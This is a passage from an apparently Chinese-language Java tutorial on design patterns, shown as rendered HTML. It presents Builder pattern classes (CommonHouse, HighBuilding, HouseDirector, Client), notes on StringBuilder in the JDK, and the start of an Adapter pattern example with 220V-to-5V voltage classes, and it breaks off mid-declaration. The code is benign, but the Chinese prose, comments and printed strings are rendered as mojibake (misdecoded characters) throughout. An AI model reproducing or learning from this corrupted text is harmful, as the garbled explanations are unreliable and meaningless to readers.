å°†äº§å“(æˆ¿å­) è¿”å›</span><br>   <span class="hljs-keyword">public</span> House <span class="hljs-title function_">buildHouse</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> house;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>CommonHouse</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonHouse</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; æ™®é€šæˆ¿å­æ‰“åœ°åŸº5ç±³ &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; æ™®é€šæˆ¿å­ç Œå¢™10cm &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; æ™®é€šæˆ¿å­å±‹é¡¶ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HighBuilding</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HighBuilding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HouseBuilder</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildBasic</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é«˜æ¥¼çš„æ‰“åœ°åŸº100ç±³ &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildWalls</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é«˜æ¥¼çš„ç Œå¢™20cm &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">roofed</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é«˜æ¥¼çš„é€æ˜å±‹é¡¶ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HouseDirector</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-comment">//æŒ‡æŒ¥è€…ï¼Œè¿™é‡Œå»æŒ‡å®šåˆ¶ä½œæµç¨‹ï¼Œè¿”å›äº§å“</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HouseDirector</span> &#123;<br>   <br>   <span class="hljs-type">HouseBuilder</span> <span class="hljs-variable">houseBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>   <span class="hljs-comment">//æ„é€ å™¨ä¼ å…¥ houseBuilder</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">HouseDirector</span><span class="hljs-params">(HouseBuilder houseBuilder)</span> &#123;<br>      <span class="hljs-built_in">this</span>.houseBuilder = houseBuilder;<br>   &#125;<br><br>   <span class="hljs-comment">//é€šè¿‡setter ä¼ å…¥ houseBuilder</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHouseBuilder</span><span class="hljs-params">(HouseBuilder houseBuilder)</span> &#123;<br>      <span class="hljs-built_in">this</span>.houseBuilder = houseBuilder;<br>   &#125;<br>   <br>   <span class="hljs-comment">//å¦‚ä½•å¤„ç†å»ºé€ æˆ¿å­çš„æµç¨‹ï¼Œäº¤ç»™æŒ‡æŒ¥è€…</span><br>   <span class="hljs-keyword">public</span> House <span class="hljs-title function_">constructHouse</span><span class="hljs-params">()</span> &#123;<br>      houseBuilder.buildBasic();<br>      houseBuilder.buildWalls();<br>      houseBuilder.roofed();<br>      <span class="hljs-keyword">return</span> houseBuilder.buildHouse();<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.builder.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <br>      <span class="hljs-comment">//ç›–æ™®é€šæˆ¿å­</span><br>      <span class="hljs-type">CommonHouse</span> <span class="hljs-variable">commonHouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonHouse</span>();<br>      <span class="hljs-comment">//å‡†å¤‡åˆ›å»ºæˆ¿å­çš„æŒ‡æŒ¥è€…</span><br>      <span class="hljs-type">HouseDirector</span> <span class="hljs-variable">houseDirector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HouseDirector</span>(commonHouse);<br>      <br>      <span class="hljs-comment">//å®Œæˆç›–æˆ¿å­ï¼Œè¿”å›äº§å“(æ™®é€šæˆ¿å­)</span><br>      <span class="hljs-type">House</span> <span class="hljs-variable">house</span> <span class="hljs-operator">=</span> houseDirector.constructHouse();<br>      <br>      <span class="hljs-comment">//System.out.println(&quot;è¾“å‡ºæµç¨‹&quot;);</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------------------&quot;</span>);<br>      <span class="hljs-comment">//ç›–é«˜æ¥¼</span><br>      <span class="hljs-type">HighBuilding</span> <span class="hljs-variable">highBuilding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HighBuilding</span>();<br>      <span class="hljs-comment">//é‡ç½®å»ºé€ è€…</span><br>      houseDirector.setHouseBuilder(highBuilding);<br>      <span class="hljs-comment">//å®Œæˆç›–æˆ¿å­ï¼Œè¿”å›äº§å“(é«˜æ¥¼)</span><br>      houseDirector.constructHouse();<br><br>         &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>æ™®é€šæˆ¿å­æ‰“åœ°åŸº5ç±³<br />æ™®é€šæˆ¿å­ç Œå¢™10cm</p><p>æ™®é€šæˆ¿å­å±‹é¡¶</p><p>é«˜æ¥¼çš„æ‰“åœ°åŸº100ç±³<br />é«˜æ¥¼çš„ç Œå¢™20cm<br />é«˜æ¥¼çš„é€æ˜å±‹é¡¶</p><h2 id="å»ºé€ è€…æ¨¡å¼åœ¨-jdk-çš„åº”ç”¨å’Œæºç åˆ†æ"><a class="markdownIt-Anchor" href="#å»ºé€ è€…æ¨¡å¼åœ¨-jdk-çš„åº”ç”¨å’Œæºç åˆ†æ"></a> å»ºé€ è€…æ¨¡å¼åœ¨ JDK çš„åº”ç”¨å’Œæºç åˆ†æ</h2><ol><li><p>java.lang.StringBuilder ä¸­çš„å»ºé€ è€…æ¨¡å¼</p></li><li><p>ä»£ç è¯´æ˜+Debug æºç </p></li></ol><ol><li><p>Appendable æ¥å£å®šä¹‰äº†å¤šä¸ª append æ–¹æ³•(æŠ½è±¡æ–¹æ³•), å³ Appendable ä¸ºæŠ½è±¡å»ºé€ è€…, å®šä¹‰äº†æŠ½è±¡æ–¹æ³•</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224214505679.png" alt="image-20221224214505679" /></p></li><li><p>AbstractStringBuilder å®ç°äº† Appendable æ¥å£æ–¹æ³•ï¼Œè¿™é‡Œçš„ AbstractStringBuilder</p><p>å·²ç»æ˜¯å»ºé€ è€…ï¼Œåªæ˜¯ä¸èƒ½å®ä¾‹åŒ–</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224220521554.png" alt="image-20221224220521554" /></p></li><li><p>StringBuilder å³å……å½“äº†æŒ‡æŒ¥è€…è§’è‰²ï¼ŒåŒæ—¶å……å½“äº†å…·ä½“çš„å»ºé€ è€…ï¼Œå»ºé€ æ–¹æ³•çš„å®ç°æ˜¯ç”± AbstractStringBuilder å®Œæˆ, è€Œ StringBuilder ç»§æ‰¿äº† AbstractStringBuilder</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224220732126.png" alt="image-20221224220732126" /></p></li></ol><h2 id="å»ºé€ è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#å»ºé€ è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å»ºé€ è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>å®¢æˆ·ç«¯(ä½¿ç”¨ç¨‹åº)ä¸å¿…çŸ¥é“äº§å“å†…éƒ¨ç»„æˆçš„ç»†èŠ‚ï¼Œå°†äº§å“æœ¬èº«ä¸äº§å“çš„åˆ›å»ºè¿‡ç¨‹è§£è€¦ï¼Œä½¿å¾—ç›¸åŒçš„åˆ›å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„äº§å“å¯¹è±¡</p></li><li><p>æ¯ä¸€ä¸ªå…·ä½“å»ºé€ è€…éƒ½ç›¸å¯¹ç‹¬ç«‹ï¼Œè€Œä¸å…¶ä»–çš„å…·ä½“å»ºé€ è€…æ— å…³ï¼Œå› æ­¤å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ›¿æ¢å…·ä½“å»ºé€ è€…æˆ–å¢åŠ æ–°çš„å…·ä½“å»ºé€ è€…ï¼Œ ç”¨æˆ·ä½¿ç”¨ä¸åŒçš„å…·ä½“å»ºé€ è€…å³å¯å¾—åˆ°ä¸åŒçš„äº§å“å¯¹è±¡</p></li><li><p>å¯ä»¥æ›´åŠ ç²¾ç»†åœ°æ§åˆ¶äº§å“çš„åˆ›å»ºè¿‡ç¨‹ ã€‚å°†å¤æ‚äº§å“çš„åˆ›å»ºæ­¥éª¤åˆ†è§£åœ¨ä¸åŒçš„æ–¹æ³•ä¸­ï¼Œä½¿å¾—åˆ›å»ºè¿‡ç¨‹æ›´åŠ æ¸…æ™°ï¼Œä¹Ÿæ›´æ–¹ä¾¿ä½¿ç”¨ç¨‹åºæ¥æ§åˆ¶åˆ›å»ºè¿‡ç¨‹</p></li><li><p>å¢åŠ æ–°çš„å…·ä½“å»ºé€ è€…æ— é¡»ä¿®æ”¹åŸæœ‰ç±»åº“çš„ä»£ç ï¼ŒæŒ‡æŒ¥è€…ç±»é’ˆå¯¹æŠ½è±¡å»ºé€ è€…ç±»ç¼–ç¨‹ï¼Œç³»ç»Ÿæ‰©å±•æ–¹ä¾¿ï¼Œç¬¦åˆâ€œå¼€é—­åŸåˆ™â€</p></li><li><p>å»ºé€ è€…æ¨¡å¼æ‰€åˆ›å»ºçš„äº§å“ä¸€èˆ¬å…·æœ‰è¾ƒå¤šçš„å…±åŒç‚¹ï¼Œå…¶ç»„æˆéƒ¨åˆ†ç›¸ä¼¼ï¼Œå¦‚æœäº§å“ä¹‹é—´çš„å·®å¼‚æ€§å¾ˆå¤§ï¼Œåˆ™ä¸é€‚åˆä½¿ç”¨å»ºé€ è€…æ¨¡å¼ï¼Œå› æ­¤å…¶ä½¿ç”¨èŒƒå›´å—åˆ°ä¸€å®šçš„é™åˆ¶ã€‚</p></li><li><p>å¦‚æœäº§å“çš„å†…éƒ¨å˜åŒ–å¤æ‚ï¼Œå¯èƒ½ä¼šå¯¼è‡´éœ€è¦å®šä¹‰å¾ˆå¤šå…·ä½“å»ºé€ è€…ç±»æ¥å®ç°è¿™ç§å˜åŒ–ï¼Œå¯¼è‡´ç³»ç»Ÿå˜å¾—å¾ˆåºå¤§ï¼Œå› æ­¤åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦è€ƒè™‘æ˜¯å¦é€‰æ‹©å»ºé€ è€…æ¨¡å¼.</p></li><li><p>æŠ½è±¡å·¥å‚æ¨¡å¼ VS å»ºé€ è€…æ¨¡å¼</p><p>æŠ½è±¡å·¥å‚æ¨¡å¼å®ç°å¯¹äº§å“å®¶æ—çš„åˆ›å»ºï¼Œä¸€ä¸ªäº§å“å®¶æ—æ˜¯è¿™æ ·çš„ä¸€ç³»åˆ—äº§å“ï¼šå…·æœ‰ä¸åŒåˆ†ç±»ç»´åº¦çš„äº§å“ç»„åˆï¼Œé‡‡ç”¨æŠ½è±¡å·¥å‚æ¨¡å¼ä¸éœ€è¦å…³å¿ƒæ„å»ºè¿‡ç¨‹ï¼Œåªå…³å¿ƒä»€ä¹ˆäº§å“ç”±ä»€ä¹ˆå·¥å‚ç”Ÿäº§å³å¯ã€‚è€Œå»ºé€ è€…æ¨¡å¼åˆ™æ˜¯è¦æ±‚æŒ‰ç…§æŒ‡å®šçš„è“å›¾å»ºé€ äº§å“ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯é€šè¿‡ç»„è£…é›¶é…ä»¶è€Œäº§ç”Ÿä¸€ä¸ªæ–°äº§å“</p></li></ol><h1 id="é€‚é…å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#é€‚é…å™¨æ¨¡å¼"></a> <mark>é€‚é…å™¨æ¨¡å¼</mark></h1><p>é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰æ˜¯ä½œä¸ºä¸¤ä¸ªä¸å…¼å®¹çš„æ¥å£ä¹‹é—´çš„æ¡¥æ¢ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒç»“åˆäº†ä¸¤ä¸ªç‹¬ç«‹æ¥å£çš„åŠŸèƒ½ã€‚</p><p>è¿™ç§æ¨¡å¼æ¶‰åŠåˆ°ä¸€ä¸ªå•ä¸€çš„ç±»ï¼Œè¯¥ç±»è´Ÿè´£åŠ å…¥ç‹¬ç«‹çš„æˆ–ä¸å…¼å®¹çš„æ¥å£åŠŸèƒ½ã€‚ä¸¾ä¸ªçœŸå®çš„ä¾‹å­ï¼Œè¯»å¡å™¨æ˜¯ä½œä¸ºå†…å­˜å¡å’Œç¬”è®°æœ¬ä¹‹é—´çš„é€‚é…å™¨ã€‚æ‚¨å°†å†…å­˜å¡æ’å…¥è¯»å¡å™¨ï¼Œå†å°†è¯»å¡å™¨æ’å…¥ç¬”è®°æœ¬ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ç¬”è®°æœ¬æ¥è¯»å–å†…å­˜å¡ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„å®ä¾‹æ¥æ¼”ç¤ºé€‚é…å™¨æ¨¡å¼çš„ä½¿ç”¨ã€‚å…¶ä¸­ï¼ŒéŸ³é¢‘æ’­æ”¾å™¨è®¾å¤‡åªèƒ½æ’­æ”¾ mp3 æ–‡ä»¶ï¼Œé€šè¿‡ä½¿ç”¨ä¸€ä¸ªæ›´é«˜çº§çš„éŸ³é¢‘æ’­æ”¾å™¨æ¥æ’­æ”¾ vlc å’Œ mp4 æ–‡ä»¶ã€‚</p><h2 id="ä»‹ç»-5"><a class="markdownIt-Anchor" href="#ä»‹ç»-5"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ã€‚é€‚é…å™¨æ¨¡å¼ä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸»è¦è§£å†³åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œå¸¸å¸¸è¦å°†ä¸€äº›&quot;ç°å­˜çš„å¯¹è±¡&quot;æ”¾åˆ°æ–°çš„ç¯å¢ƒä¸­ï¼Œè€Œæ–°ç¯å¢ƒè¦æ±‚çš„æ¥å£æ˜¯ç°å¯¹è±¡ä¸èƒ½æ»¡è¶³çš„ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong></p><p>1ã€ç³»ç»Ÿéœ€è¦ä½¿ç”¨ç°æœ‰çš„ç±»ï¼Œè€Œæ­¤ç±»çš„æ¥å£ä¸ç¬¦åˆç³»ç»Ÿçš„éœ€è¦ã€‚</p><p>2ã€æƒ³è¦å»ºç«‹ä¸€ä¸ªå¯ä»¥é‡å¤ä½¿ç”¨çš„ç±»ï¼Œç”¨äºä¸ä¸€äº›å½¼æ­¤ä¹‹é—´æ²¡æœ‰å¤ªå¤§å…³è”çš„ä¸€äº›ç±»ï¼ŒåŒ…æ‹¬ä¸€äº›å¯èƒ½åœ¨å°†æ¥å¼•è¿›çš„ç±»ä¸€èµ·å·¥ä½œï¼Œè¿™äº›æºç±»ä¸ä¸€å®šæœ‰ä¸€è‡´çš„æ¥å£ã€‚</p><p>3ã€é€šè¿‡æ¥å£è½¬æ¢ï¼Œå°†ä¸€ä¸ªç±»æ’å…¥å¦ä¸€ä¸ªç±»ç³»ä¸­ã€‚ï¼ˆæ¯”å¦‚è€è™å’Œé£ç¦½ï¼Œç°åœ¨å¤šäº†ä¸€ä¸ªé£è™ï¼Œåœ¨ä¸å¢åŠ å®ä½“çš„éœ€æ±‚ä¸‹ï¼Œå¢åŠ ä¸€ä¸ªé€‚é…å™¨ï¼Œåœ¨é‡Œé¢åŒ…å®¹ä¸€ä¸ªè™å¯¹è±¡ï¼Œå®ç°é£çš„æ¥å£ã€‚ï¼‰</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> ç»§æ‰¿æˆ–ä¾èµ–ï¼ˆæ¨èï¼‰ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> é€‚é…å™¨ç»§æ‰¿æˆ–ä¾èµ–å·²æœ‰çš„å¯¹è±¡ï¼Œå®ç°æƒ³è¦çš„ç›®æ ‡æ¥å£ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong></p><p>1ã€ç¾å›½ç”µå™¨ 110Vï¼Œä¸­å›½ 220Vï¼Œå°±è¦æœ‰ä¸€ä¸ªé€‚é…å™¨å°† 110V è½¬åŒ–ä¸º 220Vã€‚</p><p>2ã€JAVA JDK 1.1 æä¾›äº†Enumeration æ¥å£ï¼Œè€Œåœ¨ 1.2 ä¸­æä¾›äº† Iterator æ¥å£ï¼Œæƒ³è¦ä½¿ç”¨ 1.2 çš„ JDKï¼Œåˆ™è¦å°†ä»¥å‰ç³»ç»Ÿçš„ Enumerationæ¥å£è½¬åŒ–ä¸º Iterator æ¥å£ï¼Œè¿™æ—¶å°±éœ€è¦é€‚é…å™¨æ¨¡å¼ã€‚</p><p>3ã€åœ¨ LINUX ä¸Šè¿è¡Œ WINDOWS ç¨‹åºã€‚</p><p>4ã€JAVA ä¸­çš„ jdbcã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1ã€å¯ä»¥è®©ä»»ä½•ä¸¤ä¸ªæ²¡æœ‰å…³è”çš„ç±»ä¸€èµ·è¿è¡Œã€‚</p><p>2ã€æé«˜äº†ç±»çš„å¤ç”¨ã€‚</p><p>3ã€å¢åŠ äº†ç±»çš„é€æ˜åº¦ã€‚</p><p>4ã€çµæ´»æ€§å¥½ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ã€è¿‡å¤šåœ°ä½¿ç”¨é€‚é…å™¨ï¼Œä¼šè®©ç³»ç»Ÿéå¸¸é›¶ä¹±ï¼Œä¸æ˜“æ•´ä½“è¿›è¡ŒæŠŠæ¡ã€‚æ¯”å¦‚ï¼Œæ˜æ˜çœ‹åˆ°è°ƒç”¨çš„æ˜¯ A æ¥å£ï¼Œå…¶å®å†…éƒ¨è¢«é€‚é…æˆäº† Bæ¥å£çš„å®ç°ï¼Œä¸€ä¸ªç³»ç»Ÿå¦‚æœå¤ªå¤šå‡ºç°è¿™ç§æƒ…å†µï¼Œæ— å¼‚äºä¸€åœºç¾éš¾ã€‚å› æ­¤å¦‚æœä¸æ˜¯å¾ˆæœ‰å¿…è¦ï¼Œå¯ä»¥ä¸ä½¿ç”¨é€‚é…å™¨ï¼Œè€Œæ˜¯ç›´æ¥å¯¹ç³»ç»Ÿè¿›è¡Œé‡æ„ã€‚</p><p>2.ç”±äº JAVAè‡³å¤šç»§æ‰¿ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥è‡³å¤šåªèƒ½é€‚é…ä¸€ä¸ªé€‚é…è€…ç±»ï¼Œè€Œä¸”ç›®æ ‡ç±»å¿…é¡»æ˜¯æŠ½è±¡ç±»ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> æœ‰åŠ¨æœºåœ°ä¿®æ”¹ä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„ç³»ç»Ÿçš„æ¥å£ï¼Œè¿™æ—¶åº”è¯¥è€ƒè™‘ä½¿ç”¨é€‚é…å™¨æ¨¡å¼ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> é€‚é…å™¨ä¸æ˜¯åœ¨è¯¦ç»†è®¾è®¡æ—¶æ·»åŠ çš„ï¼Œè€Œæ˜¯è§£å†³æ­£åœ¨æœå½¹çš„é¡¹ç›®çš„é—®é¢˜ã€‚</p><p><strong>ç”¨æˆ·æ”¶åˆ°åé¦ˆç»“æœï¼Œæ„Ÿè§‰åªæ˜¯å’Œç›®æ ‡æ¥å£äº¤äº’</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225155334445.png" alt="image-20221225155334445" /></p><h2 id="ç±»é€‚é…å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#ç±»é€‚é…å™¨æ¨¡å¼"></a> ç±»é€‚é…å™¨æ¨¡å¼</h2><h3 id="ç±»é€‚é…å™¨æ¨¡å¼ä»‹ç»"><a class="markdownIt-Anchor" href="#ç±»é€‚é…å™¨æ¨¡å¼ä»‹ç»"></a> ç±»é€‚é…å™¨æ¨¡å¼ä»‹ç»</h3><p>åŸºæœ¬ä»‹ç»ï¼šAdapter ç±»ï¼Œé€šè¿‡ç»§æ‰¿ src ç±»ï¼Œå®ç° dst ç±»æ¥å£ï¼Œå®Œæˆ src-&gt;dst çš„é€‚é…ã€‚</p><h3 id="ç±»é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"><a class="markdownIt-Anchor" href="#ç±»é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹"></a> ç±»é€‚é…å™¨æ¨¡å¼åº”ç”¨å®ä¾‹</h3><p>åº”ç”¨å®ä¾‹è¯´æ˜</p><p>ä»¥ç”Ÿæ´»ä¸­å……ç”µå™¨çš„ä¾‹å­æ¥è®²è§£é€‚é…å™¨ï¼Œå……ç”µå™¨æœ¬èº«ç›¸å½“äº Adapterï¼Œ220V äº¤æµç”µç›¸å½“äº src (å³è¢«é€‚é…è€…)ï¼Œæˆ‘ä»¬çš„ç›® dst(å³ ç›®æ ‡)æ˜¯ 5V ç›´æµç”µ</p><p>æ€è·¯åˆ†æ(ç±»å›¾)</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225161720849.png" alt="image-20221225161720849" /></p><p><code>IVoltage5V</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><br><span class="hljs-comment">//é€‚é…æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IVoltage5V</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Voltage220V</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-comment">//è¢«é€‚é…çš„ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Voltage220V</span> &#123;<br>   <span class="hljs-comment">//è¾“å‡º220Vçš„ç”µå‹ï¼Œä¸å˜</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output220V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-type">int</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> <span class="hljs-number">220</span>;<br>      System.out.println(<span class="hljs-string">&quot;ç”µå‹=&quot;</span> + src + <span class="hljs-string">&quot;ä¼&quot;</span>);<br>      <span class="hljs-keyword">return</span> src;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>VoltageAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-comment">//é€‚é…å™¨ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoltageAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Voltage220V</span> <span class="hljs-keyword">implements</span> 